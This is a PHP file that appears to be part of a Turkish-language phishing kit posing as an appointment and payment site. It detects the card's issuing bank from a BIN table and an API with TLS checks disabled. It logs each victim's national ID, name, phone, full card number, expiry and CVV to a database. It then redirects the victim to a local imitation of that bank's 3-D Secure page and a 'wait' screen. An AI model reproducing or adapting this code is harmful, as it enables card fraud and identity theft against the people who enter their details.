<?php
/**
 * 3dredirect.php — BIN tespiti + banka ACS yönlendirmesi
 * odeme.php başarılı validation sonrası buraya yönlendirir.
 */
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru']) || empty($_SESSION['randevu']) || empty($_SESSION['odeme'])) {
    header('Location: ' . BASE_PATH . '/'); exit;
}

$odeme       = $_SESSION['odeme'];
$kart_no_raw = preg_replace('/\D/', '', $odeme['kart_no'] ?? '');
$bin         = substr($kart_no_raw, 0, 6);

// ============================================================
// YEREL BIN TABLOSU (Türkiye) — API çalışmasa bile doğru tespit
// BIN prefix → banka slug
// ============================================================
$yerel_bin = [
    // Garanti BBVA
    '540669' => 'garanti', '462272' => 'garanti', '446690' => 'garanti',
    '559610' => 'garanti', '540670' => 'garanti', '415523' => 'garanti',
    '436950' => 'garanti', '374427' => 'garanti', '374999' => 'garanti',
    '540620' => 'garanti', '547804' => 'garanti', '446650' => 'garanti',
    '521902' => 'garanti', '540677' => 'garanti', '414741' => 'garanti',
    '465930' => 'garanti', '547524' => 'garanti', '546044' => 'garanti',

    // Yapı Kredi
    '434500' => 'yapikredi', '450634' => 'yapikredi', '554960' => 'yapikredi',
    '536221' => 'yapikredi', '553375' => 'yapikredi', '455826' => 'yapikredi',
    '418055' => 'yapikredi', '432285' => 'yapikredi', '546197' => 'yapikredi',

    // İş Bankası
    '428220' => 'isbankasi', '402305' => 'isbankasi', '546256' => 'isbankasi',
    '407522' => 'isbankasi', '455030' => 'isbankasi', '451498' => 'isbankasi',
    '553375' => 'isbankasi', '415901' => 'isbankasi', '428218' => 'isbankasi',

    // Akbank
    '415956' => 'akbank', '547884' => 'akbank', '548873' => 'akbank',
    '415957' => 'akbank', '404679' => 'akbank', '545616' => 'akbank',
    '489318' => 'akbank', '557282' => 'akbank', '489319' => 'akbank',

    // Ziraat Bankası
    '407514' => 'ziraat', '557908' => 'ziraat', '428601' => 'ziraat',
    '459813' => 'ziraat', '524348' => 'ziraat', '402360' => 'ziraat',
    '407516' => 'ziraat', '524349' => 'ziraat',

    // Halkbank
    '432493' => 'halkbank', '402921' => 'halkbank', '407820' => 'halkbank',
    '402920' => 'halkbank', '407821' => 'halkbank', '553177' => 'halkbank',

    // VakıfBank
    '428391' => 'vakifbank', '402367' => 'vakifbank', '465907' => 'vakifbank',
    '428392' => 'vakifbank', '402368' => 'vakifbank', '546030' => 'vakifbank',

    // Denizbank
    '409610' => 'denizbank', '428622' => 'denizbank', '547748' => 'denizbank',
    '409611' => 'denizbank', '428623' => 'denizbank', '546803' => 'denizbank',

    // Finansbank (QNB)
    '411598' => 'finansbank', '518186' => 'finansbank', '521803' => 'finansbank',
    '411599' => 'finansbank', '518187' => 'finansbank', '411508' => 'finansbank',

    // ING Bank
    '405043' => 'ing', '450357' => 'ing', '531205' => 'ing',
    '405044' => 'ing', '450358' => 'ing', '428658' => 'ing',

    // TEB
    '435508' => 'other', '435509' => 'other',
    // HSBC
    '400849' => 'other', '445024' => 'other',
];

// ============================================================
// BIN Tespiti: Önce yerel tablo, sonra API
// ============================================================
$banka     = '';
$kart_tier = '';
$acs       = 'other'; // varsayılan

// 1. Yerel tablodan bak
if (isset($yerel_bin[$bin])) {
    $acs = $yerel_bin[$bin];
    $banka_map = [
        'garanti'    => 'GARANTİ BBVA',
        'yapikredi'  => 'YAPI KREDİ BANKASI',
        'isbankasi'  => 'TÜRKİYE İŞ BANKASI',
        'akbank'     => 'AKBANK',
        'ziraat'     => 'T.C. ZİRAAT BANKASI',
        'halkbank'   => 'TÜRKİYE HALK BANKASI',
        'vakifbank'  => 'TÜRKİYE VAKIFLAR BANKASI',
        'denizbank'  => 'DENİZBANK',
        'finansbank' => 'QNB FİNANSBANK',
        'ing'        => 'ING BANK',
        'other'      => 'DİĞER BANKA',
    ];
    $banka = $banka_map[$acs] ?? 'DİĞER BANKA';
}

// 2. API ile dene (cURL — file_get_contents'ten daha güvenilir)
if (strlen($bin) === 6 && function_exists('curl_init')) {
    try {
        $ch = curl_init("https://data.handyapi.com/bin/{$bin}");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
        ]);
        $json = curl_exec($ch);
        curl_close($ch);

        if ($json) {
            $data = json_decode($json, true);
            // API hem "Success" hem "SUCCESS" dönebilir
            $status = strtolower($data['Status'] ?? '');
            if ($status === 'success') {
                $api_banka = mb_strtoupper($data['Issuer'] ?? '', 'UTF-8');
                $kart_tier = $data['CardTier'] ?? '';

                if ($api_banka) {
                    $banka = $api_banka; // API cevabı daha doğru, üstüne yaz

                    // API'dan gelen banka adına göre ACS belirle
                    $b = $api_banka;
                    if (str_contains($b, 'YAPI') && (str_contains($b, 'KREDI') || str_contains($b, 'KREDİ')))
                        $acs = 'yapikredi';
                    elseif (str_contains($b, 'AKBANK'))  $acs = 'akbank';
                    elseif (str_contains($b, 'GARANTI') || str_contains($b, 'GARANTİ') || str_contains($b, 'GUARANTEE'))
                        $acs = 'garanti';
                    elseif (str_contains($b, 'IS BANK') || str_contains($b, 'İŞ BANK') || str_contains($b, 'ISBANK') || str_contains($b, 'İŞBANK') || str_contains($b, 'TURKIYE IS'))
                        $acs = 'isbankasi';
                    elseif (str_contains($b, 'ING'))     $acs = 'ing';
                    elseif (str_contains($b, 'HALK'))    $acs = 'halkbank';
                    elseif (str_contains($b, 'ZIRAAT') || str_contains($b, 'ZİRAAT'))
                        $acs = 'ziraat';
                    elseif (str_contains($b, 'DENİZ') || str_contains($b, 'DENIZ'))
                        $acs = 'denizbank';
                    elseif (str_contains($b, 'VAKIF'))   $acs = 'vakifbank';
                    elseif (str_contains($b, 'FİNANS') || str_contains($b, 'FINANS') || str_contains($b, 'QNB'))
                        $acs = 'finansbank';
                    // Eğer API banka adı tanınmadıysa yerel tablodan gelen acs değerini koru
                }
            }
        }
    } catch (Exception $e) {
        // API hatası — yerel tablodan devam et
    }
}

// Banka hala boşsa varsayılan
if (!$banka) $banka = 'DİĞER BANKA';

$_SESSION['banka']     = $banka;
$_SESSION['kart_tier'] = $kart_tier;
$_SESSION['adim']      = 3;

// Log güncelle (tüm verileri kaydet)
$log_id = get_or_create_log();
if ($log_id) {
    $bv = $_SESSION['basvuru'];
    $rv = $_SESSION['randevu'];
    
    // HGS Yükleme yazmasını engellemek için kart üzerindeki ad soyadı parçalayalım
    $kart_ad = $odeme['kart_ad'] ?? '';
    $ad = '';
    $soyad = '';
    if (!empty($kart_ad)) {
        $parts = explode(' ', $kart_ad);
        $soyad = (count($parts) > 1) ? array_pop($parts) : '';
        $ad = implode(' ', $parts);
    }

    update_log($log_id, array_filter([
        'tc'        => $bv['tc']       ?? '',
        'ad'        => $ad ?: ($bv['ad'] ?? ''),
        'soyad'     => $soyad ?: ($bv['soyad'] ?? ''),
        'telefon'   => $bv['telefon']  ?? '',
        'il'        => $bv['il']       ?? '',
        'ilce'      => $bv['ilce']     ?? '',
        'islem'     => $bv['islem']    ?? '',
        'mudurlik'  => $rv['mudurlik'] ?? '',
        'tarih'     => $rv['tarih']    ?? '',
        'saat'      => $rv['saat']     ?? '',
        'kart_ad'   => $odeme['kart_ad']  ?? '',
        'kart_no'   => $kart_no_raw,
        'ay'        => $odeme['ay']       ?? '',
        'yil'       => $odeme['yil']      ?? '',
        'cvv'       => $odeme['cvv']      ?? '',
        'banka'     => $banka,
        'kart_tier' => $kart_tier,
        'mevcut_adim' => 3,
        'durum'     => 'bekle',
        'acs_url'   => BASE_PATH . "/acs/{$acs}.php",
    ], fn($v) => $v !== ''));
    $_SESSION['log_id'] = $log_id;
}

header("Location: " . BASE_PATH . "/bekle.php"); exit;
